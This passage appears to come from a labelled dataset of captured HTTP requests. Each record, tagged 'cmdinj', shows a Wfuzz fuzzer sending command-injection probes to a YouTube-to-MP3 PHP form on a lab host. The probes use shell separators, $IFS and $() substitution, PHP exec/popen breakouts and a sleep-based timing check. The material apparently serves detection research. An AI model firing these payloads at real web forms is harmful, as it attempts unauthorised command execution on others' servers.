+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61378",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "72"
+    },
+    "req_body": "ytlink=%20echo%20THCQQN$((0%2B88))$(echo%20THCQQN)THCQQN%5C%5C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:40 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61379",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "66"
+    },
+    "req_body": "ytlink=&echo%20QSELIT$((42%2B46))$(echo%20QSELIT)QSELIT&&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:40 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61380",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%3Becho%20OKHPYH$((66%2B11))$(echo%20OKHPYH)OKHPYH%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:41 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61382",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%7Cecho%20VZDOKD$((12%2B24))$(echo%20VZDOKD)VZDOKD%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:41 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61383",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=;echo$IFSORHOEA$((71%2B59))$(echo$IFSORHOEA)ORHOEA%26&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:41 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61384",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "69"
+    },
+    "req_body": "ytlink='%20echo%20DHXKNT$((83%2B17))$(echo%20DHXKNT)DHXKNT\"&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:42 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61385",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink='echo$IFSQUCSSY$((71%2B59))$(echo$IFSQUCSSY)QUCSSY%22&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:42 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61386",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "68"
+    },
+    "req_body": "ytlink=\"echo$IFSGOPZNT$((61%2B76))$(echo$IFSGOPZNT)GOPZNT&&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:42 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61387",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "66"
+    },
+    "req_body": "ytlink=echo$IFSSWOEAI$((89%2B70))$(echo$IFSSWOEAI)SWOEAI&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:43 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61388",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=|echo$IFSMNCLPS$((56%2B63))$(echo$IFSMNCLPS)MNCLPS%22&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:43 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61389",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "73"
+    },
+    "req_body": "ytlink=%26%26echo$IFSAHYRFK$((59%2B15))$(echo$IFSAHYRFK)AHYRFK\"&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:43 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61390",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "72"
+    },
+    "req_body": "ytlink=%7Cecho$IFSGUAVSF$((73%2B82))$(echo$IFSGUAVSF)GUAVSF%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:44 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61391",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%27%20echo%20NPYOVU$((6%2B61))$(echo%20NPYOVU)NPYOVU\\&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:44 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61392",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "77"
+    },
+    "req_body": "ytlink=%27||echo$IFSJIUIDF$((89%2B41))$(echo$IFSJIUIDF)JIUIDF%2F%2F&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:45 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61393",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "72"
+    },
+    "req_body": "ytlink=%22||echo$IFSBZQTDK$((6%2B37))$(echo$IFSBZQTDK)BZQTDK//&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:45 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61394",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "73"
+    },
+    "req_body": "ytlink=%22&echo$IFSGVEIAO$((60%2B74))$(echo$IFSGVEIAO)GVEIAO%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:45 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61395",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "68"
+    },
+    "req_body": "ytlink=;echo$IFSOZHGXS$((54%2B58))$(echo$IFSOZHGXS)OZHGXS\\&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:45 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61397",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "72"
+    },
+    "req_body": "ytlink=%7Cecho$IFSRIYZJH$((86%2B76))$(echo$IFSRIYZJH)RIYZJH%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:46 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61398",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "69"
+    },
+    "req_body": "ytlink=||echo$IFSDAJJOA$((63%2B6))$(echo$IFSDAJJOA)DAJJOA//&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:46 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61399",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "75"
+    },
+    "req_body": "ytlink=%7C%7Cecho$IFSEXCORO$((79%2B26))$(echo$IFSEXCORO)EXCORO%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:46 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61400",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "107"
+    },
+    "req_body": "ytlink=\")print(`echo%20SPTGKB`.`echo%20$((57%2B66))`.`echo%20SPTGKB`.`echo%20SPTGKB`)%29%7DSPTGKB&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:47 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61401",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "112"
+    },
+    "req_body": "ytlink=');}print(`echo%20MMQDEE\\necho%20$((77%2B28))\\necho%20MMQDEE\\necho%20MMQDEE`)%3B%25252523MMQDEE&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:47 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61402",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "103"
+    },
+    "req_body": "ytlink=${exec(print(`echo%20BDBPSZ;echo%20$((87%2B50));echo%20BDBPSZ;echo%20BDBPSZ`)%3BBDBPSZ&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:47 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61403",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "114"
+    },
+    "req_body": "ytlink=${popen(print(`echo%20XZRRJD`.`echo%20$((95%2B86))`.`echo%20XZRRJD`.`echo%20XZRRJD`)%3B.%27XZRRJD&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:48 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61404",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "139"
+    },
+    "req_body": "ytlink=%7C%20%5B%205%20-ne%20%24%28echo%20ZDEVVW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:49 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61405",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "186"
+    },
